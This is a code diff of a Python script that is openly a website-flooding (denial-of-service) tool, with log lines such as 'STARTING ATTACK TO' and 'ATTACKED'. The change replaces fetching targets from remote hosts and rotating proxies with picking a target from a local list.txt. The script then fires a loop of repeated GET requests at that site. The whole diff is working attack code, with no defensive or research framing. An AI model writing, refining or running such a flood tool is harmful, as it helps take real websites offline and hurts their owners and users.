@@ -110,7 +110,6 @@ def get_proxy(data, checker):
 
 def mainth():
     current_target = None
-    current_proxy = None
 
     while True:
 
@@ -119,45 +118,16 @@ def mainth():
         logger.info("GET RESOURCES FOR ATTACK")
 
         # Fetching data with proxy and targets
-        content = {}
-        data = {}
-        while True:
-            current_host = choice(HOSTS)
-            try:
-                content = scraper.get(current_host).content
-                data = loads(content)
-                break
-            except:
-                logger.warning("FAILED TO FETCH API TARGETS")
-                sleep(1)
-                logger.info("FETCHING API AGAIN")
+        with open('list.txt') as f:
+            sites = f.read().splitlines()
+
+        data = choice(sites)
 
         if current_target is None:
-            current_target = unquote(data['site']['page'])
+            current_target = unquote(data)
 
         if current_target.startswith('http') is False:
             current_target = "https://" + current_target
-
-        # Choosing and checking proxy
-        if current_proxy is not None:
-            if not check_proxie(current_host, current_proxy):
-                current_proxy = get_proxy(data, current_host)
-                # current_proxy = get_proxy(data)
-                pass
-        else:
-            current_proxy = get_proxy(data, current_host)
-            # current_proxy = get_proxy(data)
-
-        if current_proxy is None:
-            continue
-
-        # Trying target
-        if not check_taget(current_target, current_proxy):
-            current_target = None
-            continue
-
-        scraper.proxies.update({"http": "http://" + current_proxy + current_target,
-                                "https": "https://" + current_proxy + current_target})
 
         logger.info("STARTING ATTACK TO " + current_target)
         for _ in range(MAX_REQUESTS):
@@ -170,7 +140,7 @@ def mainth():
                     response = scraper.get(current_target)
                 logger.info("ATTACKED; RESPONSE CODE: " +
                             str(response.status_code))
-            except:
+            except Exception as err:
                 logger.warning("GOT ISSUE WHILE ATTACKING")
 
 
